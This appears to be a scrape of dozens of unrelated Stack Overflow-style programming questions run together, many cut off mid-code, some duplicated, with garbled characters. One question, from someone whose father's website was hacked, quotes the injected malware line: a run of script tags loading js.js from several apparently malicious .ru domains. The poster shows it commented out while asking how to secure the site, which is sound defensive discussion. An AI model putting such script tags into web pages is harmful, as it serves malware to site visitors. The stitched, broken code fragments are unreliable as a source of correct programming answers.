@TITLE:Using ng-repeat and limitTo to limit the number of visible items displayed
@CONTENT:I'm trying to limit my result sets to a fixed number. I can use limitTo with ng-repeat, but this limits items regardless of their current visibility and removes items from the DOM. I want to limit to a number of visible items while keeping everything in the DOM. Here is the current code that I have. My goal is to always show no more than 50 items in the list even though items contains 500 items. <div ng-repeat="item in items | limitTo: 50">
  <div ng-show="item.visible">
    <p>item.id</p>
  </div>
</div>
 This will initially limit to 50 items, but if I filter the list (by modifying item.visible on some items), the list never shows items in the range of 50 - 500 and instead displays less than 50 items. What's the right way to limit an ng-repeat so that it only counts visible items towards the limit restriction?

Now, in C++11 we have std::thread. I guess the standard doesn't say anything about the specific implementation, so my question is about the standard library implementations. Are they generally opting for a pooled approach where constructing std::threads is cheap (and e.g. doesn't call pthread_create on posix), or will std::thread just be a wrapper? In other words, is a thread pool still recommended in C++11, or should I just create a std::thread whenever I need one and leave performance up to the standard library?

    assert(!foo_negative(x));
    return 0;
}
 We have a template function foo_negative that takes an object of any type and determines whether its foo attribute is negative. The main function instantiates foo_negative with [T = X]. This program compiles and runs without any output. Now, add this function to the top of the program: template <class T>
void foo()
{
}
 Compiling it with G++ 4.6.3 results in this compiler error: funcs.cpp: In function ¡¥bool foo_negative(T&)¡¦:
funcs.cpp:13:14: error: parse error in template argument list
funcs.cpp: In function ¡¥bool foo_negative(T&) [with T = X]¡¦:
funcs.cpp:25:5:   instantiated from here
funcs.cpp:13:14: error: ¡¥foo¡¦ is not a member template function
 (Where Line 13 is return v.foo < 0 and Line 25 is assert(!foo_negative(x)).) Clang produces similar errors. Wat? How did adding an unrelated function that is never called manage to introduce a syntax error into a valid program? When parsing foo_negative, the compiler doesn't know the type of v, and crucially, it doesn't know whether v.foo is a member template or a regular member. Apparently, it has to decide at parsing time (before the template is instantiated) whether to treat it as a member template or a regular member. If it thinks v.foo is a member template, then < 0 is seen as passing 0 as a template argument, and there is a missing >, hence the syntax error. Then, when foo_negative is instantiated with [T = X], there is another error because X::foo is not a member template. But why does it think v.foo is a member template? This ambiguity is precisely what the template keyword is for: if I wrote v.template foo, then I would be explicitly telling C++ to expect a member template, but I didn't use the template keyword! I didn't refer to a member template, so it should assume that it's a regular member. The fact that there's a function of the same name as the member shouldn't have any effect. Why does it? It can't be a bug in the compiler because GCC and clang are consistent.
@CODE:v.foo T& v template class <T> void foo() #include <cassert>

/** Determine whether the 'foo' attribute of an object is negative. */
template <class T>
bool foo_negative(T& v)
{
    return v.foo < 0;

@CONTENT:I'm currently studying the Mockito framework and I've created several test cases using Mockito. But then I read that instead of invoking mock(SomeClass.class) I can use the @Mock and the @InjectMocks - The only thing I need to do is to annotate my test class with @RunWith(MockitoJUnitRunner.class) or use the MockitoAnnotations.initMocks(this); in the @Before method. But it doesn't work - It seems that the @Mock wont work! Here is my 2 codes revisions - one using the annotations and one without. What am I doing wrong? public class ReportServiceImplTestMockito {

        mockTaskService = mock(TaskServiceImpl.class);
        service.setTaskServiceImpl(mockTaskService);
    }

}

public class ReportServiceImplTestMockito {

     @Mock 
     private TaskService      mockTaskService;

 Is the NoException method really needed? If an exception is going to be thrown it'll be thrown in the CorrectCount method too.

@TITLE:C++11: std::thread pooled?
@CONTENT:In C++03 I used pthread with a self-built thread pool that always kept a couple of threads running (since pthread_create is slow), this way I was able to launch threads for small tasks without thinking about performance issues. Now, in C++11 we have std::thread. I guess the standard doesn't say anything about the specific implementation, so my question is about the standard library implementations. Are they generally opting for a pooled approach where constructing std::threads is cheap (and e.g. doesn't call pthread_create on posix), or will std::thread just be a wrapper? In other words, is a thread pool still recommended in C++11, or should I just create a std::thread whenever I need one and leave performance up to the standard library?

@LINK:/questions/10671406/c-confusing-attribute-name-for-member-template
@TITLE:C++ confusing attribute name for member template
@CONTENT:I've found that when accessing a non-template attribute (v.foo) from a variable of a template type (T& v), C++ can be tricked into thinking that it is a member template if there is a template function of the same name (template class <T> void foo()). How can this be explained from the C++ spec? Consider this simple program: #include <cassert>

/** Determine whether the 'foo' attribute of an object is negative. */
template <class T>
bool foo_negative(T& v)
{
    return v.foo < 0;
}

struct X
{
    int foo;
};

int main()
{
    X x;
    x.foo = 5;
    assert(!foo_negative(x));
    return 0;
}
 We have a template function foo_negative that takes an object of any type and determines whether its foo attribute is negative. The main function instantiates foo_negative with [T = X]. This program compiles and runs without any output. Now, add this function to the top of the program: template <class T>
void foo()
{
}
 Compiling it with G++ 4.6.3 results in this compiler error: funcs.cpp: In function ¡¥bool foo_negative(T&)¡¦:
funcs.cpp:13:14: error: parse error in template argument list
funcs.cpp: In function ¡¥bool foo_negative(T&) [with T = X]¡¦:
funcs.cpp:25:5:   instantiated from here
funcs.cpp:13:14: error: ¡¥foo¡¦ is not a member template function
 (Where Line 13 is return v.foo < 0 and Line 25 is assert(!foo_negative(x)).) Clang produces similar errors. Wat? How did adding an unrelated function that is never called manage to introduce a syntax error into a valid program? When parsing foo_negative, the compiler doesn't know the type of v, and crucially, it doesn't know whether v.foo is a member template or a regular member. Apparently, it has to decide at parsing time (before the template is instantiated) whether to treat it as a member template or a regular member. If it thinks v.foo is a member template, then < 0 is seen as passing 0 as a template argument, and there is a missing >, hence the syntax error. Then, when foo_negative is instantiated with [T = X], there is another error because X::foo is not a member template. But why does it think v.foo is a member template? This ambiguity is precisely what the template keyword is for: if I wrote v.template foo, then I would be explicitly telling C++ to expect a member template, but I didn't use the template keyword! I didn't refer to a member template, so it should assume that it's a regular member. The fact that there's a function of the same name as the member shouldn't have any effect. Why does it? It can't be a bug in the compiler because GCC and clang are consistent.
@CODE:v.foo T& v template class <T> void foo() #include <cassert>

/** Determine whether the 'foo' attribute of an object is negative. */
template <class T>
bool foo_negative(T& v)

    return v.foo < 0;

 Is the NoException method really needed? If an exception is going to be thrown it'll be thrown in the CorrectCount method too. I'm leaning towards keep it as 2 test cases (maybe refactor the repeated code as another method) because a test should only test for a single thing, but maybe my interpretation is wrong.
@CODE:[TestCase]
    public void InsertionSortedSet_AddValues_NoException()

        var test = new InsertionSortedSet<int>();

        test.Add(5);

        test.Add(7);
        test.Add(4);
        test.Add(9);
    }

    [TestCase]
    public void InsertionSortedSet_AddValues_CorrectCount()

        var test = new InsertionSortedSet<int>();

        test.Add(5);

Do not confuse with the go back in debugger feature used in VS's intellitrace debugging tool) Right now I place a bookmark and return to my bookmark. But I forget most of times to place a bookmark. Hence this question. There's got to be a shortcut to get back to current line of execution or stopped at or whatever phrase is used to describe this.

@CONTENT:Coming from Struts2 I'm used to declaring @Namespace annotation on super classes (or package-info.java) and inheriting classes would subsequently pick up on the value in the @Namespace annotation of its ancestors and prepend it to the request path for the Action. I am now trying to do something similar in Spring MVC using @RequestMapping annotation as follows (code trimmed for brevity): package au.test

@RequestMapping(value = "/")
public abstract class AbstractController {
    ...
}

au.test.user

@RequestMapping(value = "/user")
public abstract class AbstractUserController extends AbstractController {

    @RequestMapping(value = "/dashboard")

}

public abstract class TwitterController extends AbstractTwitterController {

    @RequestMapping(value = "/updateStatus")    
    public String updateStatus() {
        ....
    }
}
 / works as expect /user/dashboard works as expected However when I would have expected /user/twitter/updateStatus to work it does not and checking the logs I can see a log entry which looks something like: org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping - Mapped URL path [/tweeter/updateStatus] onto handler 'twitterController' Is there a setting I can enable that will scan the superclasses for @RequestMapping annotations and construct the correct path?

@TITLE:How to get current hour (time of day) in linux kernel space
@CONTENT:I'm writing a kernel module that checks to see if the time is between two specified hours, and disables input if it is. This has to do with me wanting to make sure I go to bed early. (I know I could also use any number of different techniques including cron etc, but I wanted to learn kernel programming...) As a first version, I therefore check if the current hour is between start and end, which are set via parameters to the module. My question is therefore : How do I get the current hour? I have no access to the usual time functions in the standard library because I am in kernel space. I'm guessing that I should be using do_gettimeofday() for this, but that only gives me seconds and nanoseconds, and I need hours in the current day. Thanks.

        return 997 * ((int)x) ^ 991 * ((int)y); //large primes! 
    }
 ...As this is from an established Java library, I know that it works just fine. Then I have a Boundary class, which holds 2 vectors, "start" and "end" (representing the endpoints of a line). The values of these 2 vectors are what characterize the boundary.     /*class Boundary*/

@TITLE:Phonegap camera android kills cordova
@CONTENT:I'm working on several Phonegap projects. In some of them I'm using the camera functions. I'm puzzling with this issue (from the Phonegap documentation): Android Quirks Android uses intents to launch the camera activity on the device to capture images, and on phones with low memory, the Cordova activity may be killed. In this scenario, the image may not appear when the cordova activity is restored. I'm having this problem on one of my test devices constantly (HTC One X). It's quite full, so good to test this. I noticed there is an alternative plugin: https://code.google.com/p/foreground-camera-plugin/ for this problem. But I try to avoid plugins as much as possible... (to be portable to other platforms easily). And it's available up to Phonegap 2.4.0 and I'm working with Phonegap 2.9.0 I already use the file URI and not the Data (to avoid the memory problem). My question is: does anybody know when Android decides to kill other activities (like Cordova, which is quite needed for Phonegap). On what level of free memory? (percentage, MB). So I could check this in advance and warn the user. Of course I hope this issue gets resolved... but it doesn't seem to be resolved soon.... Edit after the first remark I've no intention resolving the real problem, I've found out that's not really possible. It's a thing between Android and Phonegap. I just need to know whether it's possible to warn the user this will happen. So the user can kill some of the other apps before continuing... So when does this occur? When does android think there is not enough memory to get this thing going on? That's my question. Edit 2013 Nov. 29th Because of the link given by AustinAllover, I now know this is not just a Phonegap issue... The Android camera seems to kill all Java apps in case of too few memory... so the question is more generic than Phonegap/Cordova only...

However I could not propagate a lens through a Maybe using at. After reading a lot of Stack Overflow answers, I came across this one. It turns out that replacing at with ix solved my type problems if I also replaced (^.) with (^?). Question: It seems like at and ix do the same thing, at least with regard to Map. Both take a key and give a 'Lens' to the value at that key. However, ix seems to play nice with the function composition operator (.). What is the difference between the two? Off Topic Rant: I like infix operators as much as the next guy but the Control.Lens package seems to have gone a little overboard. For a new user having some English names and a key somewhere would lower the learning curve. Due to the huge number of wrapper classes used in the Lens library it is particularly difficult to dig through the type signatures if you don't already know what is going on. My code is starting to look like Perl for heaven sake.

@TITLE:Split string into list of N-length strings using LINQ
@CONTENT:I know the concept of String.Split has been addressed before with a multitude of different approaches, but I am specifically interested in a LINQ solution to this question. I've attempted to write an extension class to handle the split, but both attempts have some major issues. So for the following: string s = "ABCDEFGHIJKLMNOPQRSTUVWX";
var results = s.SplitEvery(4);
 I would want a list like: { "ABCD", "EFGH", "IJKL", "MNOP", "QRST", "UVWX" } Here is my extension class: public static class Extensions
{
    public static List<string> SplitEvery(this string s, int n)
    {
        List<string> list = new List<string>();

        var Attempt1 = s.Select((c, i) => i % n== 0 ? s.Substring(i, n) : "|").Where(x => x != "|").ToList();

        var Attempt2 = s.Where((c, i) => i % n== 0).Select((c, i) => s.Substring(i, n)).ToList();

        return list;
    }
}
 Attempt 1 inserts a dummy string "|" every time the condition isn't met, then removes all instances of the dummy string to create the final list. It works, but creating the bad strings seems like an unnecessary extra step. Furthermore, this attempt fails if the string isn't evenly divisible by n. Attempt 2 was me trying to select only substrings where the index was divisible by N, but the 'i' value in the Select statement doesn't correspond to the 'i' value in the Where statement, so I get results like: { "ABCD", "BCDE", etc... } I feel like I'm close to a good solution, but could use a helpful nudge in the right direction. Any suggestions? [Edit] I ended up going with a combination of suggestions to handle my string-splitter. It might not be the fastest, but as a newbie to LINQ, this implementation was the most succinct and easy for me to understand. public static List<string> SplitEvery(this string s, int size)
{
    return s.Select((x, i) => i)
        .Where(i => i % size == 0)
        .Select(i => String.Concat(s.Skip(i).Take(size))).ToList();
}
 Thanks for all the excellent suggestions.

@TITLE:How can I set a form contained inside a ng-include to be prestine?
@CONTENT:I have the following code: <div modal="modal.shouldBeOpen" close="close()" options="opts">
    <div class="modal-body">
        <form novalidate name="itemForm" style="margin-bottom: 0px;">
 Which is contained inside the included file modal.html <div data-ng-controller="AdminController">
   <ng-include src="'/Content/app/admin/partials/grid-subject.html'"></ng-include >
   <ng-include src="'/Content/app/admin/partials/modal.html'"></ng-include>
</div>
 In my AdminController controller I am trying to use the following code to reset the form to pristine: $scope.itemForm.$setPristine();
 When I do this it tells me that "itemForm" is undefined. Is there a way I can set the contents of the form to pristine. I assume this is a scope problem but I am not sure how to fix it. I tried the one solution of removing the second include and pasting the code in directly. This solution works. However we want to be able to reuse code so I would like to be able to do this with an include for modal.html Note that the reason we would like to do this is because we have something like the following on our modal.html:     <button
        class="btn float-right"
        data-ng-disabled="itemForm.$pristine"
        data-ng-click="modalReset()"
        data-ng-show="modal.resetButton">
        Reset</button>
</form>
 So we are actually inside of the itemForm and would like to set it to $pristine from the button inside.
@CODE:<div modal="modal.shouldBeOpen" close="close()" options="opts">
    <div class="modal-body">
        <form novalidate name="itemForm" style="margin-bottom: 0px;"> <div data-ng-controller="AdminController">
   <ng-include src="'/Content/app/admin/partials/grid-subject.html'"></ng-include >
   <ng-include src="'/Content/app/admin/partials/modal.html'"></ng-include>
</div> $scope.itemForm.$setPristine(); <button
        class="btn float-right"
        data-ng-disabled="itemForm.$pristine"
        data-ng-click="modalReset()"
        data-ng-show="modal.resetButton">

@TITLE:Django add extra field to a ModelForm generated from a Model
@CONTENT:I'm developing a Django application. My problem now is that I have to generate a FormSet from a model, but I also need to insert an "extra value" for every form. In the specific, I have this JApplet that generates some Markers and Paths on a image, and POST it on the server. In my model, lines are composed from two Markers. But when I POST it, because I'm using the id generated from the JApplet and not from the database, I will not know by which Markers a Path will be composed. So I tought to insert a "temporary id" on the Marker on the form, to do the correct arrangements on the view before saving the Path. I tought to define a custom form for the markers, but it not seems to be very DRY, and I don't want to came back to this if I'll change the Marker model. I hope to be quite clear. In the other case ask freely. Thank you. EDIT Here is the form:   class PointForm(forms.ModelForm):
    temp_id = forms.IntegerField()
    class Meta:

@CONTENT:If the size of an empty class can't be 0, what magic is doing std::tuple so the sizeof of unique_ptr is returning 8 in a 64 bit machine? In unique_ptr the member is defined as:   typedef std::tuple<typename _Pointer::type, _Dp>  __tuple_type;                 
  __tuple_type  _M_t;
 Where _Dp is the deleter class. Compiler is gcc version 4.7.1 (Debian 4.7.1-7)

@TITLE:Is it safe to use emplace_back with a container of unique_ptrs?
@CONTENT:Consider the following: std::vector<std::unique_ptr<int>> ptrsToInts;
ptrsToInts.emplace_back(new int);
 If reallocation occurs in the vector, and that fails (throwing std::bad_alloc), am I "safe" or will I leak an int? C++11 23.3.6.5 [vector.modifiers]/1 says: If an exception is thrown other than by the copy constructor, move constructor, assignment operator, or move assignment operator of T or by any InputIterator operation there are no effects. which seems to indicate that this is a potential problem. That is, if there are "no effects", then no unique_ptr ever was constructed, and therefore the destructor behavior one would rely on to delete that pointer would not occur. (Which might indicate that emplace_back should be banned for containers of unique_ptrs)
@CODE:std::vector<std::unique_ptr<int>> ptrsToInts;
ptrsToInts.emplace_back(new int); std::bad_alloc int T InputIterator unique_ptr delete emplace_back unique_ptr new std::make_unique

@LINK:/questions/12547201/comparing-integer-objects
@TITLE:Comparing Integer objects
@CONTENT:I have the following code: public class Test {

    public static void main(String[] args) {

        Integer alpha = new Integer(1);
        Integer foo = new Integer(1);

        if(alpha == foo) {
            System.out.println("1. true");
        }

        if(alpha.equals(foo)) {
            System.out.println("2. true");
        }

    } 

}
 The output is as follows: 2. true
 However changing the type of an Integer object to int will produce a different output, for example: public class Test {

    public static void main(String[] args) {

        Integer alpha = new Integer(1);
        int foo = 1;

        if(alpha == foo) {
            System.out.println("1. true");
        }

        if(alpha.equals(foo)) {
            System.out.println("2. true");
        }

    } 

}
 The new output: 1. true
2. true
 How can this be so? Why doesn't the first example code output 1. true?
@CODE:public class Test {

    public static void main(String[] args) {

        Integer alpha = new Integer(1);
        Integer foo = new Integer(1);

        if(alpha == foo) {
            System.out.println("1. true");
        }

        if(alpha.equals(foo)) {
            System.out.println("2. true");
        }

    } 

} 2. true Integer object int public class Test {

    public static void main(String[] args) {

        Integer alpha = new Integer(1);
        int foo = 1;

        if(alpha == foo) {
            System.out.println("1. true");
        }

        if(alpha.equals(foo)) {
            System.out.println("2. true");
        }

    } 

} 1. true
2. true 1. true

1  john   2      0

john  1    0
 But when I run the pivot method, it is saying: *** ReshapeError: Index contains duplicate entries, cannot reshape
 Which doesn't makes sense, even in example there are repeated entries on the foo column. I'm using the name column as the index of the pivot, the first argument of the pivot method call.

var convno = myno.toString( 16 );
alert( convno );
 all is well there. now i want to convert it back to decimal. But now I cannot write var orgno = parseInt( convno, 16 );
alert( orgno );
 As it doesn't return the decimal part. And cannot use parseFloat, since per MDC the syntax of parseFloat is parseFloat(str);
 It wouldn't have been a problem if I had to convert back to int, since parseInt syntax is parseInt(str [, radix]);
 So what is an alternative for this? Disclaimer: I thought it was a trivial question but googling gave me no answers.

@LINK:/questions/4019585/how-to-use-ninject-conventions-extension-without-referencing-assembly-or-types
@TITLE:How to use Ninject Conventions extension without referencing Assembly (or Types within it)
@CONTENT:Sorry in advance for the long question, it's long because I've been digging at this all day. The general problem: I have an ASP.Net MVC2 application with the following projects: MyApp.Web, MyApp.Services, MyApp.Data. We code to interfaces and utilize Ninject 2 for DI/IoC. However, I'm getting awfully tired of typing (and forgetting to type): Bind<ISomeService>.To<SomeService>;
 So, knowing about Ninject.Extensions.Convensions, I have attempted to use it to automatically scan and register modules and simple dependencies of the type IXxxx => Xxxx. What I tried that works (but isn't quite enough): I can use the following code to setup Ninject, and everything seems to get wired up as expected.     public static IKernel Initialize()
    {
        var kernel = new StandardKernel();

        kernel.Scan(a => {
                        a.FromAssemblyContaining<MyApp.Data.SomeDataClass>();
                        a.FromAssemblyContaining<MyApp.Services.SomeServiceClass>();
                        a.AutoLoadModules();
                        a.BindWithDefaultConventions();
                        a.InTransientScope();
                    });

        return kernel;
    }
 What I want to accomplish instead: However ... I'd like to take this a bit further in a way I think is supported, but I cannot seem to get it working. Since our MyApp.Web project uses nothing at all (directly) from MyApp.Data, I am trying to avoid a reference to MyApp.Data. With the above code, I must reference MyApp.Data from MyApp.Web because of the compile time reference to SomeDataClass. I would prefer to specify the name of an assembly for Ninject to scan and register. It seems the Conventions extension supports this through the From overloads that take a string (or enumerable of strings). What I tried and how it breaks: So, I've tried several variations on the From overloads:     public static IKernel Initialize()
    {
        var kernel = new StandardKernel();

        kernel.Scan(a => {
                        a.From("MyApp.Data");
                        a.From("MyApp.Services.dll");
                        a.From("AnotherDependency, Version=1.0.0.0, PublicKeyToken=null"); //etc., etc. with the From(...)'s
                        a.AutoLoadModules();
                        a.BindWithDefaultConventions();
                        a.InTransientScope();
                    });

        return kernel;
    }
 But I receive FileNotFoundExceptions with a message like: Could not load file or assembly 'file:///C:\Program Files (x86)\Common Files\Microsoft Shared\DevServer\10.0\MyApp.Data' or one of its dependencies. The system cannot find the file specified.":"file:///C:\Program Files (x86)\Common Files\Microsoft Shared\DevServer\10.0\ What I've found trying to solve this myself: I've checked out the source for Ninject.Extensions.Conventions, and I'll admit I get totally lost as to how this is supposed to work, but I can see what it is doing. The assembly scanner builds up a list of assemblies to scan as we call various FromXXX methods. When I call the From("assemblyName") method, it first checks if the list already contains any assemblies where the assembly.AssemblyName.Name equals the name I passed in (and AssemblyName.Name is the simple name, i.e. MyApp.Data, according to MSDN). Flow passes through a couple unimportant methods, landing in the FindAssemblies method. This method takes the name I passed in (which we already saw is supposed to be a simple assembly name). It then creates a new AssemblyName, with our passed in name used as the AssemblyName.CodeBase. Then, it attempts to Load the assembly into a temporary AppDomain. This is the step that fails with the above exception. Obviously, the path it's searching is wrong, but I cannot supply a path through the From() method. That doesn't work either. I've tried some of the other FromXXX methods, but I've gotten nowhere and spent too much time on this already. The FromAssembliesInPath and FromAssembliesMatching also do not work because, again, it is searching in the completely wrong directory. Uh .. what was the question again: Can anyone explain how to get Ninject Conventions to load assemblies by name, without creating a reference to the assembly and loading it by specifying a contained type? Please. I've already searched through pages and pages of the Ninject google group, and I've read it's only (so it seems) relevant documentation and have not been able to solve it .. yet.

@LINK:/questions/2964687/how-to-handle-100-continue-http-message
@TITLE:How to handle ¡§100 continue¡¨ HTTP message?
@CONTENT:I'm writing a simplistic HTTP server that will accept PUT requests mostly from cURL as client and I'm having a bit of an issue with handling the Expect: 100-continue header. As I understand it, the server is supposed to read the header, send back a HTTP/1.1 100 Continue response on the connection, read the stream up to the value on Content-Length and then send back the real response code (Usually HTTP/1.1 200 OK but any other valid HTTP answer should do). Well, that's exactly what my server does. The problem is that, apparently, if I send a 100 Continue answer, cURL fails to report any subsequent HTTP error code and assumes the upload was a success. For instance, if the upload is rejected due to the nature of the content (there is a basic data check happening), I want the calling client to detect the problem and act accordingly. Am I missing something obvious ? edit: here is a sample output from cURL with a secondary header containing an error: > PUT /test1%2Epdf HTTP/1.1

@TITLE:Are Symfony and CakePHP too slow to be usable?
@CONTENT:Until now, I have always said that CakePHP is too bloated and slow. I don't really know that, I just saw "some" benchmarks. What I really want to know, is that if those two frameworks (Symfony and CakePHP) are too slow to be usable in a way that the user will get frustrated. I already know that those frameworks are slower than other alternatives, but that's not the question. I ask the question because I want to create a project management web application and I still hesitate between a couple frameworks. I've had some trouble learning Zend, but imho I haven't tried hard enough. So in conclusion, in addition to the first question above, I would like to ask another question: If I want to create a project management tool (which is a pretty big project), which of the following should you suggest, considering the developement time, the speed of the resulting application, and the robustness of the final product: Symfony CakePHP Zend Framework Also I should mention that I don't know any of those frameworks, and that I want to learn one of them (at least).

@CONTENT:In a C# project we add a reference to a COM object via the Add References setup pointing to a COM object which results in the IDE auto-generating the interop assembly. So this is fine and good, but we are building based on .net 3.5 SP1 aka CLR 2.0, and the generated interops are using the 4.0 CLR making them incompatible. Is there a way to prevent this? I assume the other option is configure our build script to try using tlbimp.exe with the /references parameter? to point to mscorlib v2.0? Anyhow, I'm hoping there's a flag somewhere to allow this.

@TITLE:Selecting a multi-dimensional array in LINQ [duplicate]
@CONTENT:This question already has an answer here: Generate a two dimensional array via LINQ 1 answer I have a task where I need to translate a DataTable to a two-dimensional array. That's easy enough to do by just looping over the rows and columns (see example below). private static string[,] ToArray(DataTable table)
{
    var array = new string[table.Rows.Count,table.Columns.Count];

    for (int i = 0; i < table.Rows.Count; ++i)
        for (int j = 0; j < table.Columns.Count; ++j)
            array[i, j] = table.Rows[i][j].ToString();

    return array;
}
 What I'd really like to do is use a select statement in LINQ to generate that 2D array. Unfortunately it looks like there is no way in LINQ to select a multidimensional array. Yes, I'm aware that I can use LINQ to select a jagged array, but that's not what I want. Is my assumption correct, or is there a way to use LINQ to select a multi-dimensional array?
@CODE:private static string[,] ToArray(DataTable table)
{
    var array = new string[table.Rows.Count,table.Columns.Count];

@CONTENT:Although it seems to be a very common issue, I did not harvest much information: How can I create a safe interface between DLL boundaries regarding memory alloction? It is quite well-known that // in DLL a
DLLEXPORT MyObject* getObject() { return new MyObject(); }
// in DLL b 
MyObject *o = getObject();
delete o;
 might certainly lead to crashes. But since interactions like the one above are - as I dare say - not uncommon, there has to be a way to ensure safe memory allocation. Of course, one could provide // in DLL a
DLLEXPORT void deleteObject(MyObject* o) { delete o; }
 but maybe there are better ways (e.g. smart_ptr?). I read about using custom allocators when dealing with STL containers as well. So my inquiry is more about general pointers to articles and/or literature dealing with this topic. Are there special fallacies to look out for (exception handling?) and is this problem limited to only DLLs or are UNIX shared objects "inflicted" too?

@CONTENT:My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor. I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL. So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer). I did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked... I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions? He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted? So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked? For the record, here is the line of code that "magically" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this): <!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->

@LINK:/questions/30376601/valgrind-memory-still-reachable-with-trivial-program-using-iostream
@TITLE:Valgrind: Memory still reachable with trivial program using <iostream>
@CONTENT:Take the following trivial program: #include <iostream>
int main() {
  return 0;
}
 If I run this using valgrind, I'm told that there are 72,704 bytes in 1 blocks that are still reachable. There have been extensive discussions on SO about whether or not to worry about still reachable warnings--I'm not concerned about that. I'd just like to understand how simply including a standard library header could cause a still reachable warning, when none of the objects from that library were allocated in the program itself. Here is the full valgrind output: $ valgrind --leak-check=full --track-origins=yes --show-reachable=yes ./ValgrindTest

@TITLE:Split string into array without deleting delimiter?
@CONTENT:I have a string like  "asdf a  b c2 "
 And I want to split it into an array like this: ["asdf", " ", "a", " ", " ", "b", " ", "c2", " "]
 Using string.split(" ") removes the spaces, resulting in this: ["asdf", "a", "", "b", "c2"]
 I thought of inserting extra delimiters, e.g. string.replace(/ /g, "| |").replace(/||/g, "|").split("|");
 But this gives an unexpected result.
@CODE:"asdf a  b c2 " ["asdf", " ", "a", " ", " ", "b", " ", "c2", " "] string.split(" ") ["asdf", "a", "", "b", "c2"] string.replace(/ /g, "| |").replace(/||/g, "|").split("|"); 'asdf a b. . c2% * '

@TITLE:Skew one corner of image
@CONTENT:I'm trying to skew one single corner of my div background as shown at the green checkmark in the image below: In CSS3 I'm however unable to achieve that, skewing completely skews every corner. I just want to skew the bottom right corner to the left (say 25px) and maintain the perspective (as shown in the image above).  background-image: url('http://rtjansen.nl/images/stackoverflow.png');
-webkit-transform: skew(-45deg);
 Fiddle: http://jsfiddle.net/3eX5j/ My code is: div {    
    width: 300px;
    height:80px;
    margin-left:40px;
    background-image: url('http://rtjansen.nl/images/stackoverflow.png');

@TITLE:Bundled css link gets a 404 error
@CONTENT:I am trying to get bundling to work in ASP.NET MVC 4. I am getting a 404 error from the link generated for the bundled CSS. I have done the following: Installed the "Microsoft ASP.NET Web Optimization Framework" package via NuGet (v4.0.20710.0) Created a BundleConfig class in the App_Start dir with the following contents: using System.Web.Optimization;
namespace BsdAppTemplate.Web_Nancy.App_Start
{
    public class BundleConfig
    {
        public static void RegisterBundles(BundleCollection bundles)
        {
            bundles.Add(new StyleBundle("~/bundles/styles/cvi").Include(
                "~/mainstyles.css"
            ));
        }
    }
}
 Added the following to Web.config at site root: <system.web>
    <compilation debug="false" targetFramework="4.5" />

    <pages>
      <namespaces>
